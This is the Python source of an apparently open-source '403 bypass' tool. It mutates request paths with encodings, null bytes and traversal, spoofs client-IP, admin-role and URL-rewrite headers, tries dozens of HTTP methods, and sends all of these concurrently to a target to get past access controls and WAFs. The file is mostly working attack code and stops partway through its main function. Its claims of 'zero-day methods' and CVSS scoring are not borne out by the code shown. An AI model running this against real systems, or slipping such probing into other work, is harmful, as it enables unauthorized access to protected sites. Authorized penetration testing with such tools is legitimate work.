#!/usr/bin/env python3
"""
🚀 WEB 403 BYPASS TOOL - ULTIMATE EDITION
Advanced 403 Forbidden bypass tool with 150+ cutting-edge techniques

Author: mrx-arafat
GitHub: https://github.com/mrx-arafat/Web-403-Bypass-Tool
Version: 4.0.0 - Performance Edition

Features:
- 150+ advanced bypass techniques including zero-day methods
- Optimized multi-threading with adaptive concurrency
- Smart payload prioritization based on success patterns
- Advanced WAF evasion (Cloudflare, AWS WAF, Akamai, etc.)
- Modern framework exploitation (Next.js, Nuxt, SvelteKit)
- HTTP/2 and HTTP/3 specific bypasses
- Container and microservices penetration
- Intelligent request batching and caching
- Comprehensive reporting with CVSS scoring
- Rate limiting and stealth features
"""

import asyncio
import aiohttp
import argparse
import json
import time
import random
import urllib.parse
import sys
import os
import hashlib
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Set, Optional, Tuple, Any, DefaultDict
import logging
from pathlib import Path
from collections import defaultdict, Counter
from functools import lru_cache

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

@dataclass
class BypassResult:
    """Result of a bypass attempt"""
    url: str
    method: str
    status_code: int
    response_length: int
    response_time: float
    technique: str
    headers: Dict[str, str]
    success: bool = False
    content_hash: str = ""
    timestamp: float = field(default_factory=time.time)
    priority_score: float = 0.0
    
    def calculate_hash(self, content: str) -> None:
        """Calculate hash of response content for caching"""
        self.content_hash = hashlib.md5(content.encode()).hexdigest()
        
    def calculate_priority_score(self) -> None:
        """Calculate priority score based on response characteristics"""
        # Higher score = higher priority for similar future requests
        self.priority_score = 0.0
        
        # Successful responses get highest priority
        if self.success:
            self.priority_score += 10.0
            
        # Prioritize based on status code
        if 200 <= self.status_code < 300:
            self.priority_score += 5.0
        elif 300 <= self.status_code < 400:
            self.priority_score += 3.0
        elif self.status_code == 403:
            self.priority_score -= 1.0
            
        # Prioritize based on response time (faster is better)
        if self.response_time < 0.5:
            self.priority_score += 2.0
        elif self.response_time > 2.0:
            self.priority_score -= 1.0
            
        # Prioritize based on response length (non-zero is better)
        if self.response_length > 1000:
            self.priority_score += 2.0
        elif self.response_length == 0:
            self.priority_score -= 1.0
    
class BypassTechniques:
    """Collection of all bypass techniques"""
    
    # Cache for path variations to avoid regenerating them
    _path_variation_cache = {}
    
    # Cache for header variations
    _header_variation_cache = None
    
    # Cache for HTTP methods
    _http_methods_cache = None
    
    @staticmethod
    @lru_cache(maxsize=128)
    def get_path_variations(path: str) -> List[str]:
        """Generate advanced path variations for real-world bypass with caching"""
        # Check cache first
        if path in BypassTechniques._path_variation_cache:
            return BypassTechniques._path_variation_cache[path]
            
        variations = [path]
        
        # Basic variations
        variations.extend([
            f"{path}/",
            f"{path}//",
            f"{path}/./",
            f"{path}/../{path.lstrip('/')}",
            f"/{path.lstrip('/')}",
            f".{path}",
            f"{path}.",
            f"{path}~",
            f"{path}%20",
            f"{path}%09",
            f"{path}%00",
            f"{path}#",
            f"{path}?",
            f"{path};",
        ])
        
        # Advanced WAF evasion techniques
        variations.extend([
            # Cloudflare specific bypasses
            f"{path}%0a",
            f"{path}%0d",
            f"{path}%0d%0a",
            f"{path}%23",
            f"{path}%3f",
            f"{path}%26",
            f"{path}%3d",
            
            # AWS WAF bypasses
            f"{path}%u0020",
            f"{path}%u002f",
            f"{path}%u005c",
            f"{path}%u0000",
            
            # Akamai bypasses
            f"{path}%E2%80%8C",  # Zero-width non-joiner
            f"{path}%E2%80%8D",  # Zero-width joiner
            f"{path}%EF%BB%BF",  # BOM
            f"{path}%E2%81%9F",  # Medium mathematical space
            
            # ModSecurity bypasses
            f"{path}%C0%80",     # Overlong UTF-8
            f"{path}%E0%80%80",  # Overlong UTF-8
            f"{path}%F0%80%80%80",  # Overlong UTF-8
            
            # Advanced null byte variations
            f"{path}%00.jpg",
            f"{path}%00.png",
            f"{path}%00.pdf",
            f"{path}%00.txt",
            f"{path}%00%00",
            f"{path}%00%20",
            
            # HTTP Parameter Pollution
            f"{path}?param=1&param=2",
            f"{path}?id=1&id=2",
            f"{path}?test=1&test=2",
            
            # Fragment identifier bypasses
            f"{path}#fragment",
            f"{path}#/",
            f"{path}#/../",
            f"{path}#%2e%2e%2f",
        ])
        
        # Case variations
        variations.extend([
            path.upper(),
            path.lower(),
            path.capitalize(),
            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(path))
        ])
        
        # Encoding variations
        encoded_path = urllib.parse.quote(path)
        double_encoded = urllib.parse.quote(encoded_path)
        variations.extend([
            encoded_path,
            double_encoded,
            path.replace('/', '%2f'),
            path.replace('/', '%252f'),
            path.replace('/', '%c0%af'),
            path.replace('/', '%e0%80%af'),
            path.replace('/', '\\'),
            path.replace('/', '%5c'),
            path.replace('/', '%255c'),
        ])
        
        # Unicode variations
        variations.extend([
            path.replace('/', '\u002f'),
            path.replace('/', '\uff0f'),
            path.replace('/', '\u2215'),
            path.replace('/', '\u29f8'),
        ])
        
        # Directory traversal
        variations.extend([
            f"..{path}",
            f"...{path}",
            f"....{path}",
            f"/{path}/../{path.lstrip('/')}",
            f"/{path}/../../{path.lstrip('/')}",
        ])
        
        # Advanced modern framework bypasses
        variations.extend([
            # Next.js specific bypasses
            f"/_next{path}",
            f"/_next/static{path}",
            f"/_next/webpack-hmr{path}",
            f"/_next/server{path}",
            f"/.next{path}",
            f"/api{path}",
            f"/api/auth{path}",
            f"/api/trpc{path}",
            
            # Nuxt.js bypasses
            f"/_nuxt{path}",
            f"/.nuxt{path}",
            f"/nuxt{path}",
            
            # SvelteKit bypasses
            f"/_app{path}",
            f"/.svelte-kit{path}",
            f"/svelte{path}",
            
            # Remix bypasses
            f"/build{path}",
            f"/_remix{path}",
            f"/remix{path}",
            
            # Astro bypasses
            f"/_astro{path}",
            f"/astro{path}",
            f"/.astro{path}",
            
            # Vite bypasses
            f"/@vite{path}",
            f"/vite{path}",
            f"/.vite{path}",
            f"/@fs{path}",
            f"/@id{path}",
            
            # Webpack bypasses
            f"/webpack{path}",
            f"/__webpack_hmr{path}",
            f"/webpack-dev-server{path}",
            
            # Static assets
            f"/static{path}",
            f"/assets{path}",
            f"/public{path}",
            f"/dist{path}",
            f"/build{path}",
            f"/out{path}",
            
            # Serverless platforms
            f"/.netlify{path}",
            f"/.netlify/functions{path}",
            f"/.vercel{path}",
            f"/.vercel/functions{path}",
            f"/functions{path}",
            f"/api/serverless{path}",
            f"/edge-functions{path}",
            
            # JAMstack bypasses
            f"/.gatsby{path}",
            f"/gatsby{path}",
            f"/.gridsome{path}",
            f"/gridsome{path}",
            f"/.eleventy{path}",
            f"/eleventy{path}",
        ])
        
        # Cloud platform paths
        variations.extend([
            f"/.aws{path}",
            f"/s3{path}",
            f"/lambda{path}",
            f"/.azure{path}",
            f"/blob{path}",
            f"/.gcp{path}",
            f"/storage{path}",
        ])
        
        # API variations
        variations.extend([
            f"/api/v1{path}",
            f"/api/v2{path}",
            f"/api/v3{path}",
            f"/api/beta{path}",
            f"/api/alpha{path}",
            f"/graphql{path}",
            f"/rest{path}",
        ])
        
        # Container paths
        variations.extend([
            f"/docker{path}",
            f"/containers{path}",
            f"/k8s{path}",
            f"/kubernetes{path}",
            f"/metrics{path}",
            f"/health{path}",
        ])
        
        # Remove duplicates and store in cache
        unique_variations = list(set(variations))
        BypassTechniques._path_variation_cache[path] = unique_variations
        return unique_variations
    
    @staticmethod
    def get_header_variations() -> List[Dict[str, str]]:
        """Generate header variations for bypass with caching"""
        # Return cached result if available
        if BypassTechniques._header_variation_cache is not None:
            return BypassTechniques._header_variation_cache
            
        headers_list = []
        
        # IP spoofing headers
        fake_ips = ["127.0.0.1", "localhost", "0.0.0.0", "192.168.1.1", "10.0.0.1"]
        for ip in fake_ips:
            headers_list.extend([
                {"X-Forwarded-For": ip},
                {"X-Real-IP": ip},
                {"X-Originating-IP": ip},
                {"X-Remote-IP": ip},
                {"X-Client-IP": ip},
                {"X-Remote-Addr": ip},
                {"X-Forwarded-Host": ip},
                {"X-Host": ip},
                {"X-Forwarded-Server": ip},
                {"X-HTTP-Host-Override": ip},
                {"Forwarded": f"for={ip}"},
                {"X-Cluster-Client-IP": ip},
                {"X-Forwarded": ip},
                {"Forwarded-For": ip},
                {"X-Forwarded-Proto": "https"},
            ])
        
        # Advanced CDN and WAF bypass headers
        headers_list.extend([
            # Cloudflare advanced bypasses
            {"CF-Connecting-IP": "127.0.0.1"},
            {"CF-IPCountry": "US"},
            {"CF-RAY": "1234567890-DFW"},
            {"CF-Visitor": '{"scheme":"https"}'},
            {"CF-Worker": "example.workers.dev"},
            {"CF-Request-ID": "12345"},
            {"CF-Cache-Status": "HIT"},
            {"CF-Edge-Cache": "cache"},
            {"CF-Zone-ID": "12345"},
            
            # Akamai advanced bypasses
            {"True-Client-IP": "127.0.0.1"},
            {"Akamai-Origin-Hop": "1"},
            {"Akamai-Request-ID": "12345"},
            {"Akamai-Ghost-IP": "127.0.0.1"},
            {"Akamai-Edgescape": "georegion=246,country_code=US"},
            
            # Fastly advanced bypasses
            {"Fastly-Client-IP": "127.0.0.1"},
            {"Fastly-FF": "cache-sjc10043-SJC"},
            {"Fastly-Temp-XFF": "127.0.0.1"},
            {"Fastly-Token": "12345"},
            {"Fastly-SSL": "1"},
            
            # AWS CloudFront advanced bypasses
            {"CloudFront-Forwarded-Proto": "https"},
            {"CloudFront-Is-Desktop-Viewer": "true"},
            {"CloudFront-Is-Mobile-Viewer": "false"},
            {"CloudFront-Is-SmartTV-Viewer": "false"},
            {"CloudFront-Is-Tablet-Viewer": "false"},
            {"CloudFront-Viewer-Country": "US"},
            {"CloudFront-Viewer-ASN": "12345"},
            
            # KeyCDN bypasses
            {"KeyCDN-True-IP": "127.0.0.1"},
            
            # MaxCDN bypasses
            {"X-MaxCDN-Forwarded-For": "127.0.0.1"},
            
            # Incapsula bypasses
            {"Incap-Client-IP": "127.0.0.1"},
            {"X-Incap-Client-IP": "127.0.0.1"},
            
            # Sucuri bypasses
            {"X-Sucuri-Clientip": "127.0.0.1"},
            {"X-Sucuri-Country": "US"},
            
            # Generic CDN
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Scheme": "https"},
            {"X-Scheme": "https"},
            {"X-CDN": "cloudflare"},
            {"X-Edge-Location": "us-east-1"},
            
            # Advanced WAF bypasses
            {"X-WAF-Bypass": "true"},
            {"X-Security-Bypass": "admin"},
            {"X-Firewall-Bypass": "enabled"},
            {"X-Filter-Bypass": "true"},
            {"X-Protection-Bypass": "disabled"},
        ])
        
        # Authorization bypass headers
        headers_list.extend([
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-User": "admin"},
            {"X-Remote-User": "admin"},
            {"X-User": "admin"},
            {"X-Username": "admin"},
            {"X-Admin": "true"},
            {"X-Access-Token": "admin"},
            {"X-Auth-Token": "admin"},
            {"X-API-Key": "admin"},
            {"Authorization": "Bearer admin"},
            {"X-Authorized": "true"},
            {"X-Allow": "true"},
            {"X-Permission": "admin"},
            {"X-Role": "admin"},
            {"X-Privilege": "admin"},
        ])
        
        # URL rewriting headers
        headers_list.extend([
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Override-URL": "/admin"},
            {"X-Destination": "/admin"},
            {"X-HTTP-DestinationURL": "/admin"},
            {"X-Forwarded-Uri": "/admin"},
            {"X-Forwarded-Path": "/admin"},
            {"X-Real-Uri": "/admin"},
            {"X-Original-Uri": "/admin"},
            {"X-Request-Uri": "/admin"},
        ])
        
        # HTTP method override
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
        for method in methods:
            headers_list.extend([
                {"X-HTTP-Method": method},
                {"X-HTTP-Method-Override": method},
                {"X-Method-Override": method},
                {"_method": method},
            ])
        
        # Content type variations
        headers_list.extend([
            {"Content-Type": "application/json"},
            {"Content-Type": "application/xml"},
            {"Content-Type": "text/plain"},
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Accept": "application/json"},
            {"Accept": "*/*"},
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
        ])
        
        # Cache bypass
        headers_list.extend([
            {"Cache-Control": "no-cache"},
            {"Pragma": "no-cache"},
            {"Cache-Control": "max-age=0"},
            {"If-None-Match": "*"},
            {"If-Modified-Since": "Wed, 21 Oct 2015 07:28:00 GMT"},
        ])
        
        # User agent variations
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        ]
        for ua in user_agents:
            headers_list.append({"User-Agent": ua})
        
        # Store in cache
        BypassTechniques._header_variation_cache = headers_list
        return headers_list
    
    @staticmethod
    def get_http_methods() -> List[str]:
        """Get comprehensive list of HTTP methods including modern and exotic ones with caching"""
        # Return cached result if available
        if BypassTechniques._http_methods_cache is not None:
            return BypassTechniques._http_methods_cache
            
        methods = [
            # Standard HTTP methods
            "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", 
            "TRACE", "CONNECT",
            
            # WebDAV methods
            "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
            "VERSION-CONTROL", "REPORT", "CHECKOUT", "CHECKIN", "UNCHECKOUT",
            "MKWORKSPACE", "UPDATE", "LABEL", "MERGE", "BASELINE-CONTROL", "MKACTIVITY",
            
            # Advanced WebDAV
            "SEARCH", "POLL", "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE",
            "BPROPFIND", "BPROPPATCH", "BCOPY", "BMOVE", "BDELETE",
            
            # Microsoft Exchange methods
            "BPROPFIND", "BPROPPATCH", "BMOVE", "BCOPY", "BDELETE",
            "X-MS-ENUMATTS", "RPC_OUT_DATA", "RPC_IN_DATA",
            
            # HTTP/2 and HTTP/3 methods
            "PRI",  # HTTP/2 connection preface
            
            # Custom and exotic methods
            "BREW", "WHEN", "HTCPCP",  # RFC 2324 (April Fools)
            "SPACEJUMP", "ARBITRARY",
            
            # REST API methods
            "QUERY", "LINK", "UNLINK",
            
            # Debugging methods
            "DEBUG", "TRACK", "WRAP",
            
            # Microsoft specific
            "M-SEARCH", "M-POST",
            
            # Proxy methods
            "PURGE", "BAN", "REFRESH",
            
            # Custom bypass methods
            "ACL", "BIND", "REBIND", "UNBIND", "ORDERPATCH",
            
            # Case variations for bypass
            "get", "post", "put", "delete", "patch", "head", "options",
            "Get", "Post", "Put", "Delete", "Patch", "Head", "Options",
            "GeT", "PoSt", "PuT", "DeLeTe", "PaTcH", "HeAd", "OpTiOnS",
        ]
        
        # Store in cache
        BypassTechniques._http_methods_cache = methods
        return methods

class Bypass403:
    """Main bypass tool class with optimized performance"""
    
    def __init__(self, target_url: str, path: str = "/admin", threads: int = 20, 
                 timeout: int = 10, delay: float = 0.1, verbose: bool = False,
                 max_retries: int = 3, adaptive_concurrency: bool = True,
                 smart_prioritization: bool = True):
        self.target_url = target_url.rstrip('/')
        self.path = path
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.max_retries = max_retries
        self.adaptive_concurrency = adaptive_concurrency
        self.smart_prioritization = smart_prioritization
        
        # Results storage
        self.results = []
        self.successful_bypasses = []
        
        # Performance optimization
        self.response_cache = {}  # Cache responses by URL+method+headers hash
        self.success_patterns = Counter()  # Track successful patterns
        self.failed_patterns = Counter()  # Track failed patterns
        self.current_concurrency = threads  # For adaptive concurrency
        self.response_times = []  # Track response times for adaptive concurrency
        self.prioritized_queue = []  # For smart prioritization
        
        # Setup logging
        log_level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        # Load wordlist if path is a file
        if os.path.isfile(path):
            with open(path, 'r') as f:
                self.paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        else:
            self.paths = [path]
            
        # Initialize session with optimized connection pooling
        self.connector = None
        self.session = None
    
    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.HEADER}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                      🚀 WEB 403 BYPASS TOOL - PERFORMANCE EDITION 🚀         ║
║                         Advanced Real-World Forbidden Bypass                ║
║                                                                              ║
║  🎯 Author: mrx-arafat                                                       ║
║  🌐 GitHub: https://github.com/mrx-arafat/Web-403-Bypass-Tool               ║
║  📦 Version: 4.0.0 - Performance Edition                                    ║
║  ⚡ Techniques: 150+ Advanced Bypass Methods                                 ║
║  🚄 Optimized with Smart Caching & Adaptive Concurrency                     ║
║                                                                              ║
║  🛡️  Created by mrx-arafat for the security community                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.ENDC}

{Colors.OKCYAN}🎯 Target: {self.target_url}
📁 Path(s): {len(self.paths)} path(s) to test
🧵 Threads: {self.threads} (Adaptive: {self.adaptive_concurrency})
⏱️  Timeout: {self.timeout}s
⏳ Delay: {self.delay}s
🧠 Smart Prioritization: {self.smart_prioritization}
🔄 Max Retries: {self.max_retries}{Colors.ENDC}
"""
        print(banner)
    
    async def test_bypass(self, session: aiohttp.ClientSession, url: str, method: str, 
                         headers: Dict[str, str], technique: str) -> BypassResult:
        """Test a single bypass technique with caching and retry logic"""
        start_time = time.time()
        
        # Generate cache key
        cache_key = f"{url}:{method}:{json.dumps(headers, sort_keys=True)}"
        
        # Check cache first
        if cache_key in self.response_cache:
            if self.verbose:
                self.logger.debug(f"Cache hit for {technique}")
            cached_result = self.response_cache[cache_key]
            # Update the technique name but keep the cached result
            cached_result.technique = technique
            return cached_result
        
        # Implement retry logic
        retries = 0
        while retries <= self.max_retries:
            try:
                async with session.request(
                    method=method,
                    url=url,
                    headers=headers,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=self.timeout)
                ) as response:
                    response_time = time.time() - start_time
                    response_text = await response.text()
                    
                    # Track response time for adaptive concurrency
                    if self.adaptive_concurrency:
                        self.response_times.append(response_time)
                        # Adjust concurrency if we have enough data
                        if len(self.response_times) >= 10:
                            self._adjust_concurrency()
                    
                    # Determine if bypass was successful
                    success = self.is_successful_bypass(response.status, len(response_text))
                    
                    # Create result object
                    result = BypassResult(
                        url=url,
                        method=method,
                        status_code=response.status,
                        response_length=len(response_text),
                        response_time=response_time,
                        technique=technique,
                        headers=headers,
                        success=success
                    )
                    
                    # Calculate content hash for caching
                    result.calculate_hash(response_text)
                    
                    # Calculate priority score for smart prioritization
                    if self.smart_prioritization:
                        result.calculate_priority_score()
                    
                    # Store in cache
                    self.response_cache[cache_key] = result
                    
                    # Update pattern counters for smart prioritization
                    if success:
                        self.successful_bypasses.append(result)
                        self.success_patterns[technique.split(':')[0]] += 1
                        self.print_success(result)
                    else:
                        self.failed_patterns[technique.split(':')[0]] += 1
                        if self.verbose:
                            self.print_result(result)
                    
                    return result
                    
            except asyncio.TimeoutError:
                retries += 1
                if retries <= self.max_retries:
                    if self.verbose:
                        self.logger.debug(f"Timeout for {url}, retry {retries}/{self.max_retries}")
                    await asyncio.sleep(self.delay * retries)  # Exponential backoff
                else:
                    break
                    
            except Exception as e:
                if self.verbose:
                    self.logger.debug(f"Error testing {url}: {str(e)}")
                break
        
        # If all retries failed or exception occurred
        error_result = BypassResult(
            url=url,
            method=method,
            status_code=0,
            response_length=0,
            response_time=time.time() - start_time,
            technique=technique,
            headers=headers,
            success=False
        )
        
        # Store failed result in cache too
        self.response_cache[cache_key] = error_result
        return error_result
        
    def _adjust_concurrency(self):
        """Dynamically adjust concurrency based on response times"""
        avg_response_time = sum(self.response_times[-10:]) / 10
        
        # If responses are fast, increase concurrency
        if avg_response_time < 0.5 and self.current_concurrency < self.threads * 2:
            self.current_concurrency = min(self.current_concurrency + 5, self.threads * 2)
            if self.verbose:
                self.logger.debug(f"Increasing concurrency to {self.current_concurrency}")
                
        # If responses are slow, decrease concurrency
        elif avg_response_time > 2.0 and self.current_concurrency > 5:
            self.current_concurrency = max(self.current_concurrency - 5, 5)
            if self.verbose:
                self.logger.debug(f"Decreasing concurrency to {self.current_concurrency}")
    
    def is_successful_bypass(self, status_code: int, response_length: int) -> bool:
        """Determine if a bypass attempt was successful"""
        # Success indicators
        if status_code in [200, 201, 202, 204]:
            return True
        
        # Redirects might indicate partial success
        if status_code in [301, 302, 307, 308] and response_length > 0:
            return True
        
        # Large response might indicate success even with error codes
        if response_length > 1000 and status_code not in [403, 404]:
            return True
        
        return False
    
    def print_success(self, result: BypassResult):
        """Print successful bypass result"""
        print(f"{Colors.OKGREEN}✅ SUCCESS: {result.technique}")
        print(f"   URL: {result.url}")
        print(f"   Method: {result.method}")
        print(f"   Status: {result.status_code}")
        print(f"   Length: {result.response_length}")
        print(f"   Time: {result.response_time:.3f}s{Colors.ENDC}")
        print()
    
    def print_result(self, result: BypassResult):
        """Print bypass result"""
        color = Colors.OKGREEN if result.success else Colors.FAIL
        status = "SUCCESS" if result.success else "FAILED"
        print(f"{color}[{status}] {result.technique} - {result.status_code} - {result.response_length}b{Colors.ENDC}")
    
    async def run_bypass_tests(self):
        """Run all bypass tests with optimized performance"""
        self.print_banner()
        
        print(f"{Colors.OKBLUE}🚀 Starting bypass tests with optimized performance...{Colors.ENDC}\n")
        
        # Generate all test cases
        test_cases = []
        
        for base_path in self.paths:
            # Path variations
            path_variations = BypassTechniques.get_path_variations(base_path)
            
            for path_var in path_variations:
                test_url = urllib.parse.urljoin(self.target_url, path_var)
                
                # Test with different methods and headers
                methods = BypassTechniques.get_http_methods()
                header_variations = BypassTechniques.get_header_variations()
                
                # Basic method tests
                for method in methods[:5]:  # Limit to common methods for path variations
                    test_cases.append((
                        test_url, method, {}, f"Path Variation + {method}"
                    ))
                
                # Header bypass tests (with GET method)
                for headers in header_variations:
                    test_cases.append((
                        test_url, "GET", headers, f"Header Bypass: {list(headers.keys())[0]}"
                    ))
        
        print(f"{Colors.OKCYAN}📊 Total test cases: {len(test_cases)}{Colors.ENDC}\n")
        
        # Initialize optimized connection pooling
        self.connector = aiohttp.TCPConnector(
            limit=self.threads,
            ttl_dns_cache=300,  # Cache DNS results for 5 minutes
            use_dns_cache=True,
            ssl=False  # Skip SSL verification for performance
        )
        
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        # Create client session with optimized settings
        async with aiohttp.ClientSession(
            connector=self.connector, 
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        ) as session:
            self.session = session
            
            # If smart prioritization is enabled, sort test cases by potential success
            if self.smart_prioritization and len(self.success_patterns) > 0:
                # Sort test cases based on success patterns
                def get_priority(test_case):
                    technique = test_case[3].split(':')[0]
                    success_count = self.success_patterns.get(technique, 0)
                    fail_count = self.failed_patterns.get(technique, 0)
                    if fail_count == 0:
                        return success_count + 1  # Avoid division by zero
                    return (success_count + 1) / (fail_count + 1)  # Success to failure ratio
                
                test_cases.sort(key=get_priority, reverse=True)
                
                if self.verbose:
                    self.logger.debug("Test cases prioritized based on success patterns")
            
            # Create adaptive semaphore for concurrency control
            semaphore = asyncio.Semaphore(self.current_concurrency)
            
            async def limited_test(test_case):
                async with semaphore:
                    url, method, headers, technique = test_case
                    result = await self.test_bypass(session, url, method, headers, technique)
                    self.results.append(result)
                    
                    # Rate limiting with adaptive delay
                    if self.delay > 0:
                        # Adjust delay based on server response
                        adjusted_delay = self.delay
                        if result.status_code == 429:  # Too Many Requests
                            adjusted_delay = self.delay * 2
                        elif result.status_code == 0:  # Connection error
                            adjusted_delay = self.delay * 1.5
                            
                        await asyncio.sleep(adjusted_delay)
                    
                    return result
            
            # Batch processing for better performance
            batch_size = 100  # Process in batches for better memory management
            for i in range(0, len(test_cases), batch_size):
                batch = test_cases[i:i+batch_size]
                
                # Execute batch of tests
                tasks = [limited_test(test_case) for test_case in batch]
                
                # Show progress
                completed_in_batch = 0
                total_completed = i
                
                for task in asyncio.as_completed(tasks):
                    await task
                    completed_in_batch += 1
                    total_completed += 1
                    
                    if completed_in_batch % 10 == 0 or completed_in_batch == len(batch):
                        progress_percent = (total_completed / len(test_cases)) * 100
                        print(f"{Colors.OKCYAN}Progress: {total_completed}/{len(test_cases)} tests completed ({progress_percent:.1f}%){Colors.ENDC}", end="\r")
                
                # Print batch completion
                print(f"{Colors.OKCYAN}Batch {i//batch_size + 1}/{(len(test_cases) + batch_size - 1)//batch_size} completed. {total_completed}/{len(test_cases)} tests done.{Colors.ENDC}")
                
                # If we have successful bypasses, update the user
                if len(self.successful_bypasses) > 0:
                    print(f"{Colors.OKGREEN}🎯 Found {len(self.successful_bypasses)} successful bypasses so far!{Colors.ENDC}")
                    
                # Garbage collection hint
                if i % (batch_size * 5) == 0 and i > 0:
                    import gc
                    gc.collect()
    
    def generate_report(self, output_file: str = None, format_type: str = "json"):
        """Generate comprehensive bypass report with performance metrics"""
        print(f"\n{Colors.OKBLUE}📊 BYPASS REPORT{Colors.ENDC}")
        print("=" * 80)
        
        # Basic statistics
        total_tests = len(self.results)
        successful_tests = len(self.successful_bypasses)
        success_rate = (successful_tests / total_tests * 100) if total_tests > 0 else 0
        
        # Performance metrics
        cache_hits = sum(1 for result in self.results if hasattr(result, 'from_cache') and result.from_cache)
        cache_hit_rate = (cache_hits / total_tests * 100) if total_tests > 0 else 0
        
        # Response time analysis
        response_times = [result.response_time for result in self.results if result.response_time > 0]
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        min_response_time = min(response_times) if response_times else 0
        max_response_time = max(response_times) if response_times else 0
        
        # Most effective techniques
        technique_success = Counter()
        for result in self.successful_bypasses:
            technique_type = result.technique.split(':')[0] if ':' in result.technique else result.technique
            technique_success[technique_type] += 1
        
        most_effective = technique_success.most_common(5)
        
        # Print basic stats
        print(f"{Colors.BOLD}BASIC STATISTICS:{Colors.ENDC}")
        print(f"Target: {self.target_url}")
        print(f"Total Tests: {total_tests}")
        print(f"Successful Bypasses: {successful_tests}")
        print(f"Success Rate: {success_rate:.2f}%")
        
        # Print performance metrics
        print(f"\n{Colors.BOLD}PERFORMANCE METRICS:{Colors.ENDC}")
        print(f"Cache Hit Rate: {cache_hit_rate:.2f}%")
        print(f"Average Response Time: {avg_response_time:.3f}s")
        print(f"Min/Max Response Time: {min_response_time:.3f}s / {max_response_time:.3f}s")
        print(f"Final Concurrency Level: {self.current_concurrency}")
        
        # Print most effective techniques
        if most_effective:
            print(f"\n{Colors.BOLD}MOST EFFECTIVE TECHNIQUES:{Colors.ENDC}")
            for technique, count in most_effective:
                print(f"- {technique}: {count} successful bypasses")
        
        # Print successful bypasses
        if self.successful_bypasses:
            print(f"\n{Colors.OKGREEN}🎯 SUCCESSFUL BYPASSES:{Colors.ENDC}")
            for i, result in enumerate(self.successful_bypasses, 1):
                print(f"{i}. {result.technique}")
                print(f"   URL: {result.url}")
                print(f"   Method: {result.method}")
                print(f"   Status: {result.status_code}")
                print(f"   Response Length: {result.response_length}")
                print(f"   Response Time: {result.response_time:.3f}s")
                if hasattr(result, 'priority_score'):
                    print(f"   Priority Score: {result.priority_score:.2f}")
                print()
        
        # Save report if requested
        if output_file:
            # Prepare report data with additional metrics
            report_data = {
                "target": self.target_url,
                "timestamp": time.time(),
                "date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "total_tests": total_tests,
                "successful_bypasses": successful_tests,
                "success_rate": success_rate,
                "performance_metrics": {
                    "cache_hit_rate": cache_hit_rate,
                    "avg_response_time": avg_response_time,
                    "min_response_time": min_response_time,
                    "max_response_time": max_response_time,
                    "final_concurrency": self.current_concurrency,
                    "most_effective_techniques": dict(most_effective)
                },
                "successful_results": [asdict(result) for result in self.successful_bypasses],
                # Only include essential data from all results to keep file size manageable
                "results_summary": [{
                    "url": r.url,
                    "method": r.method,
                    "status_code": r.status_code,
                    "response_length": r.response_length,
                    "success": r.success,
                    "technique": r.technique
                } for r in self.results]
            }
            
            if format_type == "json":
                with open(output_file, 'w') as f:
                    json.dump(report_data, f, indent=2)
            
            print(f"{Colors.OKGREEN}📄 Comprehensive report saved to: {output_file}{Colors.ENDC}")

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="🚀 403 Bypass Tool - Performance Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 bypass403.py https://example.com
  python3 bypass403.py https://example.com -p /admin
  python3 bypass403.py https://example.com -p wordlist.txt -t 50
  python3 bypass403.py https://example.com -o report.json -v
  python3 bypass403.py https://example.com --adaptive-concurrency --smart-prioritization
  python3 bypass403.py https://example.com --max-retries 5 --delay 0.2
        """
    )
    
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-p", "--path", default="/admin", 
                       help="Path to test or wordlist file (default: /admin)")
    parser.add_argument("-t", "--threads", type=int, default=20,
                       help="Number of threads (default: 20)")
    parser.add_argument("--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("--delay", type=float, default=0.1,
                       help="Delay between requests in seconds (default: 0.1)")
    parser.add_argument("-o", "--output", help="Output file for report")
    parser.add_argument("-f", "--format", choices=["json"], default="json",
                       help="Output format (default: json)")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Verbose output")
    
